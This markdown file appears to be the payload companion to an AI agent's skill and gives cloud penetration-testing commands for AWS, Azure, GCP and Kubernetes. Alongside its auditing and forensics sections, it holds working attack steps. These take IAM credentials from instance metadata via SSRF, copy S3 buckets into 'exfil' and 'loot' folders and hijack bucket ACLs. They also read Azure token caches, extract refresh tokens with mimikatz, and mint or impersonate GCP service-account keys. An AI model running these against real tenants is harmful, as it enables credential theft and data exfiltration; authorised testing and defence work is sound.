# Cloud Security -- Attack Payloads

> This file is a companion to `SKILL.md`, containing cloud security attack payloads organized by category.

---

## 1. AWS Security Testing (awscli / ScoutSuite / Prowler)

### AWS CLI Basic Enumeration

```bash
# Confirm current identity and account
aws sts get-caller-identity

# List all regions
aws ec2 describe-regions --query 'Regions[*].RegionName' --output text

# Enumerate EC2 instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,SecurityGroups[*].GroupId]' --output table

# Enumerate RDS instances
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,PubliclyAccessible]' --output table

# Enumerate Lambda functions
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table
```

### ScoutSuite Multi-Cloud Audit

```bash
# AWS security audit
scout aws --profile default --report-dir ./report

# View the generated report in a browser
# Focus areas: IAM > Bucket policies > Security groups > Encryption configuration > Logging status
```

### Prowler Compliance Scanning

```bash
# Install Prowler
pip install prowler

# Run AWS security assessment
prowler aws -p default

# Check specific categories only
prowler aws -p default --checks iam,ec2,s3

# Output JSON format
prowler aws -p default -o json > prowler-results.json
```

---

## 2. Azure Security Testing

### Azure CLI Enumeration

```bash
# Login and get subscription information
az login
az account list --output table
az account set --subscription "TARGET_SUB_ID"

# Enumerate resource groups
az group list --output table

# Enumerate virtual machines
az vm list --show-details --query '[].[name,location,publicIps]' --output table

# Enumerate storage accounts
az storage account list --query '[].[name,location,enableHttpsTrafficOnly]' --output table

# Enumerate Key Vaults
az keyvault list --query '[].[name,location,enabledForDeployment]' --output table
```

### ScoutSuite Azure Audit

```bash
# Azure security audit
scout azure --cli

# Focus areas: RBAC assignments > Storage account encryption > NSG rules > Key Vault access policies
```

---

## 3. GCP Security Testing

### gcloud CLI Enumeration

```bash
# Authentication and project enumeration
gcloud auth login
gcloud projects list --format="table(projectId,name,lifecycleState)"
gcloud config set project TARGET_PROJECT_ID

# Enumerate Compute Engine instances
gcloud compute instances list --format="table(name,zone,status,networkInterfaces[0].accessConfigs[0].natIP)"

# Enumerate Cloud Storage buckets
gcloud storage ls --project TARGET_PROJECT_ID

# Enumerate Cloud Functions
gcloud functions list --format="table(name,region,runtime)"

# Enumerate IAM policies
gcloud projects get-iam-policy TARGET_PROJECT_ID --format=json
```

### ScoutSuite GCP Audit

```bash
# GCP security audit
scout gcp --project-id my-project
```

---

## 4. S3 Bucket Enumeration and Misconfiguration Detection

### awscli -- Bucket ACL and Policy

```bash
# List all buckets
aws s3api list-buckets --query 'Buckets[*].Name'

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket

# Check encryption configuration
aws s3api get-bucket-encryption --bucket target-bucket

# Check versioning status
aws s3api get-bucket-versioning --bucket target-bucket

# Check logging configuration
aws s3api get-bucket-logging --bucket target-bucket
```

### Anonymous Access Testing

```bash
# List public bucket contents without authentication
aws s3 ls s3://target-bucket --no-sign-request

# Download sensitive files without authentication
aws s3 cp s3://target-bucket/secrets.txt . --no-sign-request

# Anonymous upload test (verify write permissions)
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

### s3scanner Batch Scanning

```bash
# Scan a single bucket
s3scanner scan --bucket company-backup

# Batch scan bucket list
s3scanner scan --bucket-list buckets.txt --output results.json
```

---

## 5. IAM Policy Analysis

### pacu -- AWS Penetration Testing Framework

```bash
# Install and start pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu
pip install -r requirements.txt
python3 pacu.py

# pacu interactive operations
set_keys                              # Configure AWS credentials
run iam__enum_users                   # Enumerate IAM users
run iam__enum_roles                   # Enumerate IAM roles
run iam__enum_policies                # Enumerate policies
run iam__privesc_scan                 # Scan privilege escalation paths
run ec2__enum                         # Enumerate EC2 instances
```

### awscli -- Manual IAM Enumeration

```bash
# List users
aws iam list-users --output table

# List roles
aws iam list-roles --query 'Roles[*].RoleName'

# Get policy details
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1

# List policies attached to user
aws iam list-attached-user-policies --user-name target-user

# List role trust policy
aws iam get-role --role-name target-role --query 'Role.AssumeRolePolicyDocument'

# List access keys
aws iam list-access-keys --user-name target-user

# Check MFA status
aws iam list-mfa-devices --user-name target-user
```

---

## 6. Cloud Metadata Exploitation (SSRF to Cloud)

### AWS IMDSv1 / IMDSv2

```bash
# IMDSv1 -- Obtain IAM temporary credentials via SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv1 -- Get instance metadata
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/user-data

# IMDSv2 -- Requires PUT request to obtain token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Configure AWS CLI with stolen temporary credentials
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key wJalrXU...
aws configure set aws_session_token FwoGZXI...
```

### Azure IMDS

```bash
# Azure instance metadata
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Azure get managed identity token
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### GCP Metadata

```bash
# GCP instance metadata
curl -H "Metadata-Flavor:Google" "http://169.254.169.254/computeMetadata/v1/"

# GCP get service account token
curl -H "Metadata-Flavor:Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

---

## 7. Serverless Security Testing

### Lambda Function Enumeration and Security Assessment

```bash
# Enumerate Lambda functions and environment variables (may contain secrets)
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table
aws lambda get-function-configuration --function-name target-function --query 'Environment.Variables'

# Enumerate Lambda layers (may contain shared secrets)
aws lambda list-layers --query 'Layers[*].[LayerName,LatestMatchingVersion.Version]'

# Get function code download link
aws lambda get-function --function-name target-function --query 'Code.Location'

# Check function concurrency configuration
aws lambda get-function-concurrency --function-name target-function
```

---

## 8. Kubernetes / Docker Cloud Exploitation

### trivy -- Container and IaC Scanning

```bash
# Scan container image vulnerabilities
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.18

# Scan IaC configuration files (Terraform/CloudFormation)
trivy config ./terraform/
trivy config ./cloudformation/

# Scan Kubernetes cluster
trivy k8s --report summary cluster

# File system scan
trivy fs --severity HIGH,CRITICAL /path/to/project
```

### kubeaudit -- Kubernetes Security Audit

```bash
# Automated security audit
kubeaudit all -n kube-system

# Detect and suggest fixes
kubeaudit autofix -f deployment.yaml
```

### kubectl -- Manual RBAC Audit

```bash
# List all roles and cluster roles
kubectl get roles --all-namespaces
kubectl get clusterroles -o json | jq '.items[].rules'

# Check specific ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:default:sac

# Check dangerous RBAC rules -- anonymous user binding
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[]?.name=="system:anonymous")'

# Check Pod security contexts
kubectl get pods -o json | jq '.items[].spec.securityContext'

# Detect privileged containers
kubectl get pods -o json | jq '.items[].spec.containers[].securityContext.privileged'

# Check hostPath mounts
kubectl get pods -o json | jq '.items[].spec.volumes[] | select(.hostPath)'
```

---

## 9. AWS IAM Enumeration

### Policy Analysis

```bash
# Enumerate all inline policies for all users
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  echo "=== $user ==="
  aws iam list-user-policies --user-name "$user"
  aws iam list-attached-user-policies --user-name "$user"
done

# Find users with AdministratorAccess
aws iam list-entities-for-policy \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --query '{Users: PolicyUsers, Roles: PolicyRoles, Groups: PolicyGroups}'

# Analyze policy for dangerous permissions (wildcard actions)
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy \
  --version-id v1 \
  --query 'PolicyVersion.Document' | jq '.Statement[] | select(.Effect=="Allow" and (.Action | tostring | contains("*")))'

# List all access keys and their last used date
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  aws iam list-access-keys --user-name "$user" --query "AccessKeyMetadata[*].[UserName,AccessKeyId,Status,CreateDate]" --output text
done
```

### Privilege Escalation Paths

```python
# Enumerate IAM privilege escalation paths using boto3
import boto3
import json

iam = boto3.client('iam')

PRIVESC_ACTIONS = [
    'iam:CreatePolicyVersion', 'iam:SetDefaultPolicyVersion',
    'iam:PassRole', 'iam:CreateLoginProfile', 'iam:UpdateLoginProfile',
    'iam:AttachUserPolicy', 'iam:AttachGroupPolicy', 'iam:AttachRolePolicy',
    'iam:PutUserPolicy', 'iam:PutGroupPolicy', 'iam:PutRolePolicy',
    'iam:AddUserToGroup', 'iam:UpdateAssumeRolePolicy',
    'sts:AssumeRole', 'lambda:CreateFunction', 'lambda:InvokeFunction',
    'ec2:RunInstances', 'iam:CreateAccessKey'
]

def check_user_privesc(username):
    """Check if user has any privilege escalation permissions."""
    escalation_paths = []
    
    # Check inline policies
    for policy_name in iam.list_user_policies(UserName=username)['PolicyNames']:
        policy = iam.get_user_policy(UserName=username, PolicyName=policy_name)
        doc = policy['PolicyDocument']
        for stmt in doc.get('Statement', []):
            if stmt['Effect'] == 'Allow':
                actions = stmt.get('Action', [])
                if isinstance(actions, str):
                    actions = [actions]
                for action in actions:
                    if action == '*' or action in PRIVESC_ACTIONS:
                        escalation_paths.append({
                            'user': username,
                            'policy': policy_name,
                            'action': action,
                            'resource': stmt.get('Resource', '*')
                        })
    return escalation_paths

users = iam.list_users()['Users']
for user in users:
    paths = check_user_privesc(user['UserName'])
    if paths:
        print(f"[!] {user['UserName']} has {len(paths)} privesc paths:")
        for p in paths:
            print(f"    - {p['action']} via {p['policy']}")
```

### Role Chaining

```bash
# Enumerate assumable roles from current identity
aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' --output json | \
  jq '.[] | select(.[1].Statement[].Principal.AWS != null) | .[0]'

# Assume a role and enumerate further
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name privesc-test)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')

# Verify new identity
aws sts get-caller-identity

# Chain to another role from the assumed role
aws sts assume-role \
  --role-arn arn:aws:iam::987654321098:role/CrossAccountAdmin \
  --role-session-name chain-test

# Enumerate cross-account roles
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument | to_string(@), `arn:aws:iam::`) == `true`].RoleName'
```

---

## 10. S3 Bucket Exploitation

### Misconfiguration Scanning

```bash
# Comprehensive S3 bucket permission audit
for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  echo "=== $bucket ==="
  
  # Check public access block
  aws s3api get-public-access-block --bucket "$bucket" 2>/dev/null || echo "  [!] No public access block"
  
  # Check bucket ACL for public grants
  aws s3api get-bucket-acl --bucket "$bucket" --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers`]'
  
  # Check bucket policy for public access
  aws s3api get-bucket-policy --bucket "$bucket" 2>/dev/null | \
    jq '.Policy | fromjson | .Statement[] | select(.Principal=="*" or .Principal.AWS=="*")'
done

# Scan for publicly listable buckets using wordlist
while read bucket_name; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$bucket_name.s3.amazonaws.com/")
  if [ "$STATUS" != "404" ]; then
    echo "[+] $bucket_name exists (HTTP $STATUS)"
    aws s3 ls "s3://$bucket_name" --no-sign-request 2>/dev/null && echo "  [!] PUBLICLY LISTABLE"
  fi
done < bucket_wordlist.txt
```

### Data Exfiltration

```bash
# Download all accessible objects from a misconfigured bucket
aws s3 sync s3://target-bucket ./exfil/ --no-sign-request

# Search for sensitive files in bucket
aws s3 ls s3://target-bucket --recursive --no-sign-request | \
  grep -iE "\.(sql|bak|env|pem|key|csv|xlsx|json|conf|config)$"

# Download specific sensitive file types
aws s3 cp s3://target-bucket/backup/database.sql ./loot/ --no-sign-request
aws s3 cp s3://target-bucket/.env ./loot/ --no-sign-request

# Check for versioned objects (may contain deleted secrets)
aws s3api list-object-versions --bucket target-bucket --no-sign-request | \
  jq '.Versions[] | select(.Key | test("password|secret|key|credential"))'

# Retrieve a deleted version
aws s3api get-object --bucket target-bucket --key secrets.txt \
  --version-id "VERSION_ID" ./loot/secrets_old.txt --no-sign-request
```

### ACL Abuse

```bash
# Check if bucket allows authenticated AWS users to write
aws s3api get-bucket-acl --bucket target-bucket | \
  jq '.Grants[] | select(.Grantee.URI=="http://acs.amazonaws.com/groups/global/AuthenticatedUsers")'

# Upload a test file to verify write access
echo "write-test" | aws s3 cp - s3://target-bucket/write_test.txt

# Modify bucket ACL if WRITE_ACP permission exists
aws s3api put-bucket-acl --bucket target-bucket \
  --grant-full-control id=YOUR_CANONICAL_USER_ID

# Check for presigned URL generation capability
aws s3 presign s3://target-bucket/sensitive-file.pdf --expires-in 3600
```

---

## 11. Azure AD Attacks

### Token Theft

```bash
# Extract Azure AD tokens from az CLI cache
cat ~/.azure/accessTokens.json | jq '.[].accessToken'

# Extract tokens from Azure PowerShell token cache
cat ~/.azure/TokenCache.dat

# Request token using managed identity from compromised VM
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .

# Request token for Microsoft Graph
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | jq .

# Use stolen token with Azure CLI
az account get-access-token --resource https://management.azure.com/
az rest --method GET --url "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  --headers "Authorization=Bearer $TOKEN"
```

### Application Consent Abuse

```python
# Enumerate Azure AD applications with dangerous permissions
import requests

GRAPH_URL = "https://graph.microsoft.com/v1.0"
TOKEN = "STOLEN_ACCESS_TOKEN"
headers = {"Authorization": f"Bearer {TOKEN}"}

# List all applications
apps = requests.get(f"{GRAPH_URL}/applications", headers=headers).json()

dangerous_permissions = [
    'Directory.ReadWrite.All', 'RoleManagement.ReadWrite.Directory',
    'Application.ReadWrite.All', 'Mail.ReadWrite', 'Files.ReadWrite.All'
]

for app in apps.get('value', []):
    app_perms = []
    for req in app.get('requiredResourceAccess', []):
        for perm in req.get('resourceAccess', []):
            app_perms.append(perm['id'])
    
    # Check service principal for granted permissions
    sp_url = f"{GRAPH_URL}/servicePrincipals?$filter=appId eq '{app['appId']}'"
    sp = requests.get(sp_url, headers=headers).json()
    
    if sp.get('value'):
        print(f"[*] App: {app['displayName']} (AppId: {app['appId']})")
        
        # Check oauth2PermissionGrants (delegated)
        grants_url = f"{GRAPH_URL}/servicePrincipals/{sp['value'][0]['id']}/oauth2PermissionGrants"
        grants = requests.get(grants_url, headers=headers).json()
        for grant in grants.get('value', []):
            print(f"    Delegated: {grant['scope']}")
```

### PRT Extraction

```bash
# Extract Primary Refresh Token (PRT) from Windows device (requires SYSTEM)
# Using Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::cloudap" "exit"

# Using ROADtools to analyze Azure AD tokens
pip install roadtools
roadtx auth --prt-cookie "$PRT_COOKIE" --prt-sessionkey "$SESSION_KEY"
roadtx describe < token.txt

# Use PRT to request access tokens
roadtx prt -c "$PRT_COOKIE" -k "$SESSION_KEY" \
  --resource https://graph.microsoft.com

# Enumerate Azure AD with stolen token
roadrecon auth --access-token "$ACCESS_TOKEN"
roadrecon gather
roadrecon gui
```

---

## 12. GCP Service Account Abuse

### Key Extraction

```bash
# List service accounts in project
gcloud iam service-accounts list --format="table(email,displayName,disabled)"

# List service account keys (check for user-managed keys)
gcloud iam service-accounts keys list \
  --iam-account=sa@project.iam.gserviceaccount.com \
  --format="table(name,validAfterTime,validBeforeTime,keyType)"

# Create new key for service account (if iam.serviceAccountKeys.create permission)
gcloud iam service-accounts keys create key.json \
  --iam-account=sa@project.iam.gserviceaccount.com

# Activate service account with stolen key
gcloud auth activate-service-account --key-file=key.json
gcloud config set account sa@project.iam.gserviceaccount.com
```

### Impersonation

```bash
# Impersonate service account (requires iam.serviceAccounts.getAccessToken)
gcloud auth print-access-token --impersonate-service-account=target-sa@project.iam.gserviceaccount.com

# Use impersonation for resource access
gcloud compute instances list \
  --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com

# Generate OAuth2 token via impersonation
curl -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target-sa@project.iam.gserviceaccount.com:generateAccessToken" \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}'

# Chain impersonation through multiple service accounts
gcloud auth print-access-token \
  --impersonate-service-account=sa1@proj.iam.gserviceaccount.com,sa2@proj.iam.gserviceaccount.com
```

### Metadata Exploitation

```bash
# Access GCP metadata from compromised instance
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get all instance attributes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true"

# Get project-level metadata (may contain startup scripts with secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"

# Get SSH keys from metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Get service account scopes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

---

## 13. Container Registry Attacks

### Image Pulling

```bash
# Enumerate ECR repositories
aws ecr describe-repositories --query 'repositories[*].[repositoryName,repositoryUri]' --output table

# Get ECR login token and pull images
aws ecr get-login-password | docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/internal-app:latest

# Enumerate GCR images
gcloud container images list --repository=gcr.io/target-project
gcloud container images list-tags gcr.io/target-project/app

# Pull from GCR
docker pull gcr.io/target-project/app:latest

# Enumerate ACR repositories
az acr repository list --name targetregistry --output table
az acr repository show-tags --name targetregistry --repository app --output table
```

### Layer Analysis

```bash
# Export and analyze image layers for secrets
docker save target-image:latest -o image.tar
mkdir image_layers && tar xf image.tar -C image_layers/

# Search all layers for secrets
for layer in image_layers/*/layer.tar; do
  echo "=== Analyzing: $layer ==="
  tar tf "$layer" 2>/dev/null | grep -iE "\.(env|pem|key|conf|json|yml|yaml)$"
  tar xf "$layer" -O 2>/dev/null | grep -iE "(password|secret|api.key|token|private)" | head -5
done

# Use dive for interactive layer analysis
dive target-image:latest --ci --lowestEfficiency 0.9

# Extract specific file from image history
docker history --no-trunc target-image:latest | grep -i "ENV\|ARG\|COPY\|ADD"
```

### Secret Extraction

```python
# Automated secret extraction from container registry images
import subprocess
import json
import re
import os
import tempfile

SECRET_PATTERNS = [
    r'(?i)(aws_access_key_id|aws_secret_access_key)\s*[=:]\s*\S+',
    r'(?i)(password|passwd|pwd)\s*[=:]\s*\S+',
    r'(?i)(api[_-]?key|apikey)\s*[=:]\s*\S+',
    r'(?i)(secret[_-]?key|private[_-]?key)\s*[=:]\s*\S+',
    r'(?i)(database_url|db_url|connection_string)\s*[=:]\s*\S+',
    r'AKIA[0-9A-Z]{16}',  # AWS Access Key
    r'ghp_[a-zA-Z0-9]{36}',  # GitHub PAT
]

def scan_image_for_secrets(image_name):
    """Pull and scan container image layers for secrets."""
    findings = []
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Save image
        tar_path = os.path.join(tmpdir, 'image.tar')
        subprocess.run(['docker', 'save', image_name, '-o', tar_path], check=True)
        subprocess.run(['tar', 'xf', tar_path, '-C', tmpdir], check=True)
        
        # Scan each layer
        for root, dirs, files in os.walk(tmpdir):
            for f in files:
                if f == 'layer.tar':
                    layer_content = subprocess.run(
                        ['tar', 'tf', os.path.join(root, f)],
                        capture_output=True, text=True
                    ).stdout
                    
                    for pattern in SECRET_PATTERNS:
                        matches = re.findall(pattern, layer_content)
                        if matches:
                            findings.append({
                                'image': image_name,
                                'layer': root,
                                'pattern': pattern,
                                'matches': matches[:5]
                            })
    return findings

results = scan_image_for_secrets('target-registry/app:latest')
for r in results:
    print(f"[!] Secret found in {r['image']}: {r['matches']}")
```

---

## 14. Cloud Forensics

### CloudTrail Analysis

```bash
# Search CloudTrail for suspicious API calls
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
  --start-time "2026-05-01T00:00:00Z" \
  --end-time "2026-05-30T23:59:59Z" \
  --query 'Events[*].[EventTime,Username,EventName,SourceIPAddress]' --output table

# Find IAM credential creation events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey \
  --query 'Events[*].[EventTime,Username,CloudTrailEvent]'

# Search for unauthorized API calls (AccessDenied)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=UnauthorizedAccess \
  --max-results 50

# Find S3 data exfiltration events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceType,AttributeValue=AWS::S3::Object \
  --start-time "2026-05-29T00:00:00Z" | \
  jq '.Events[] | select(.EventName | test("Get|Copy|Download"))'
```

### Log Correlation

```python
# Correlate CloudTrail events to build attack timeline
import boto3
import json
from datetime import datetime, timedelta
from collections import defaultdict

cloudtrail = boto3.client('cloudtrail')

def build_attack_timeline(suspect_ip, hours_back=24):
    """Build timeline of all actions from a suspicious IP."""
    end_time = datetime.utcnow()
    start_time = end_time - timedelta(hours=hours_back)
    
    events = []
    paginator = cloudtrail.get_paginator('lookup_events')
    
    for page in paginator.paginate(
        LookupAttributes=[{'AttributeKey': 'EventSource', 'AttributeValue': 'iam.amazonaws.com'}],
        StartTime=start_time,
        EndTime=end_time
    ):
        for event in page['Events']:
            detail = json.loads(event['CloudTrailEvent'])
            if detail.get('sourceIPAddress') == suspect_ip:
                events.append({
                    'time': event['EventTime'].isoformat(),
                    'event': event['EventName'],
                    'user': event.get('Username', 'unknown'),
                    'source_ip': detail.get('sourceIPAddress'),
                    'user_agent': detail.get('userAgent', ''),
                    'resources': event.get('Resources', []),
                    'error': detail.get('errorCode', None)
                })
    
    # Sort by time and group by user
    events.sort(key=lambda x: x['time'])
    by_user = defaultdict(list)
    for e in events:
        by_user[e['user']].append(e)
    
    return {'timeline': events, 'by_user': dict(by_user), 'total_events': len(events)}

timeline = build_attack_timeline('203.0.113.42', hours_back=48)
print(f"Total suspicious events: {timeline['total_events']}")
for event in timeline['timeline']:
    status = f"[ERROR: {event['error']}]" if event['error'] else "[OK]"
    print(f"  {event['time']} | {event['user']} | {event['event']} {status}")
```

### Incident Timeline

```bash
# Azure Activity Log forensics
az monitor activity-log list \
  --start-time "2026-05-29T00:00:00Z" \
  --end-time "2026-05-30T23:59:59Z" \
  --caller "suspect@company.com" \
  --query '[].{Time:eventTimestamp, Op:operationName.value, Status:status.value}' \
  --output table

# GCP Cloud Audit Logs analysis
gcloud logging read \
  'protoPayload.authenticationInfo.principalEmail="suspect@company.com"
   AND timestamp>="2026-05-29T00:00:00Z"' \
  --format=json --limit=100 | \
  jq '.[] | {time: .timestamp, method: .protoPayload.methodName, resource: .resource.type}'

# AWS GuardDuty findings export
aws guardduty list-findings --detector-id DETECTOR_ID \
  --finding-criteria '{"Criterion":{"severity":{"Gte":7}}}' | \
  jq '.FindingIds[]' | xargs -I{} aws guardduty get-findings \
  --detector-id DETECTOR_ID --finding-ids {} | \
  jq '.Findings[] | {type: .Type, severity: .Severity, title: .Title, time: .CreatedAt}'

# Cross-cloud timeline correlation script
#!/bin/bash
echo "=== AWS CloudTrail ==="
aws cloudtrail lookup-events --start-time "$START" --end-time "$END" \
  --query 'Events[*].[EventTime,EventName]' --output text | sort

echo "=== Azure Activity Log ==="
az monitor activity-log list --start-time "$START" --end-time "$END" \
  --query '[].{t:eventTimestamp,op:operationName.value}' --output tsv | sort

echo "=== GCP Audit Log ==="
gcloud logging read "timestamp>=\"$START\" AND timestamp<=\"$END\"" \
  --format="value(timestamp,protoPayload.methodName)" | sort
```

---

## 15. AWS Network Security Assessment

### Security Group Auditing

```bash
# Find security groups with overly permissive inbound rules
for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do
  aws ec2 describe-security-groups --region "$region" --query '
    SecurityGroups[?IpPermissions[?contains(IpRanges[].CidrIp, `0.0.0.0/0`)].{
      GroupId:GroupId, GroupName:GroupName, Rules:IpPermissions[?contains(IpRanges[].CidrIp, `0.0.0.0/0`)].{FromPort:FromPort,ToPort:ToPort,IpProtocol:IpProtocol}}
    }
  ' --output json | jq '.[] | select(.Rules != null)'
done

# Check for security groups allowing all traffic (0.0.0.0/0 on all ports)
aws ec2 describe-security-groups \
  --filters Name=ip-permission.cidr,Values=0.0.0.0/0 \
  --query 'SecurityGroups[*].[GroupId,GroupName,Description]' \
  --output table

# Find unused security groups (not attached to any ENI)
for sg in $(aws ec2 describe-security-groups --query 'SecurityGroups[*].GroupId' --output text); do
  eni_count=$(aws ec2 describe-network-interfaces --filters Name=group-id,Values=$sg --query 'length(NetworkInterfaces)' --output text)
  if [ "$eni_count" = "0" ]; then
    echo "[UNUSED] $sg"
  fi
done
```

### VPC Flow Log Analysis

```bash
# Enable VPC Flow Logs for suspicious traffic detection
aws ec2 create-flow-logs \
  --resource-type VPC \
  --resource-ids vpc-12345678 \
  --traffic-type ALL \
  --log-group-name /vpc/flowlogs/suspicious \
  --deliver-logs-permission-arn arn:aws:iam::123456789012:role/flowlogsRole

# Query flow logs for suspicious patterns (data exfiltration)
aws logs filter-log-events \
  --log-group-name /vpc/flowlogs/suspicious \
  --filter-pattern '[version, account, eni, source, destination, srcport, destport="443", protocol="6", packets, bytes, windowstart, windowend, action="ACCEPT", logstatus]' \
  --start-time $(($(date +%s) - 86400))000 \
  --limit 100
```

---

## 16. Azure Network Security Review

### NSG Rule Auditing

```bash
# List all Network Security Groups with their rules
for nsg in $(az network nsg list --query '[].name' -o tsv); do
  echo "=== NSG: $nsg ==="
  az network nsg rule list --nsg-name "$nsg" --query '
    [].{Name:name,Priority:priority,Direction:direction,Access:access,Source:sourceAddressPrefix,DestPort:destinationPortRange}
  ' -o table
done

# Find NSG rules allowing unrestricted inbound access
az network nsg rule list --nsg-name target-nsg --query '
  [?direction=="Inbound" && access=="Allow" && sourceAddressPrefix=="*" || sourceAddressPrefix=="0.0.0.0/0" || sourceAddressPrefix=="Internet"]
  .{Name:name,Priority:priority,Port:destinationPortRange,Protocol:protocol}' -o table

# Check for open RDP (3389) and SSH (22) across all NSGs
for nsg in $(az network nsg list --query '[].name' -o tsv); do
  az network nsg rule list --nsg-name "$nsg" --query "
    [?destinationPortRange=='22' || destinationPortRange=='3389' || destinationPortRange=='*']
    .{Name:name,Source:sourceAddressPrefix,Port:destinationPortRange}" -o table 2>/dev/null
done
```

---

## 17. GCP IAM and Storage Auditing

### GCP IAM Policy Analysis

```python
# Analyze GCP IAM policies for overly permissive bindings
import json
import subprocess

def analyze_iam_policy(project_id):
    result = subprocess.run(
        ['gcloud', 'projects', 'get-iam-policy', project_id, '--format=json'],
        capture_output=True, text=True
    )
    policy = json.loads(result.stdout)

    dangerous_roles = [
        'roles/owner', 'roles/editor', 'roles/admin',
        'roles/iam.securityAdmin', 'roles/iam.serviceAccountAdmin',
        'roles/compute.admin', 'roles/storage.admin',
        'roles/cloudsql.admin', 'roles/container.admin'
    ]

    findings = []
    for binding in policy.get('bindings', []):
        role = binding['role']
        if role in dangerous_roles:
            for member in binding.get('members', []):
                findings.append({
                    'role': role,
                    'member': member,
                    'risk': 'CRITICAL' if 'owner' in role else 'HIGH',
                    'recommendation': f'Remove {member} from {role} if not required'
                })

    for f in sorted(findings, key=lambda x: x['risk']):
        print(f"[{f['risk']}] {f['member']} -> {f['role']}")

    return findings

analyze_iam_policy('my-project-id')
```

### GCS Bucket Enumeration

```bash
# Enumerate and test GCS bucket permissions
for bucket in $(gsutil ls); do
  echo "=== $bucket ==="
  
  # Check IAM policy
  gsutil iam get "$bucket" 2>/dev/null | jq '.bindings[] | select(.role=="roles/storage.objectViewer" or .role=="roles/storage.objectAdmin") | .members[]' 2>/dev/null
  
  # Check for public access
  gsutil uniformbucketlevelaccess get "$bucket" 2>/dev/null
  
  # Test anonymous read
  if curl -s "https://storage.googleapis.com/$(echo $bucket | sed 's|gs://||')" | head -1 | grep -q "ListBucketResult"; then
    echo "  [!] PUBLICLY ACCESSIBLE"
  fi
done
```

---

## 18. AWS EC2 Security Assessment

### Instance Metadata and User Data Analysis

```bash
# Enumerate EC2 instance metadata without IMDSv2 (test for SSRF exposure)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null

# List all EC2 instances with public IPs and security groups
aws ec2 describe-instances --query '
  Reservations[*].Instances[*].{
    ID:InstanceId,
    IP:PublicIpAddress,
    State:State.Name,
    SGs:join(",", SecurityGroups[*].GroupId),
    Name:join(",", Tags[?Key=="Name"].Value)
  }' --output table

# Check for instances with public IPs that should be internal
aws ec2 describe-instances --filters Name=ip-address-type,Values=ipv4 \
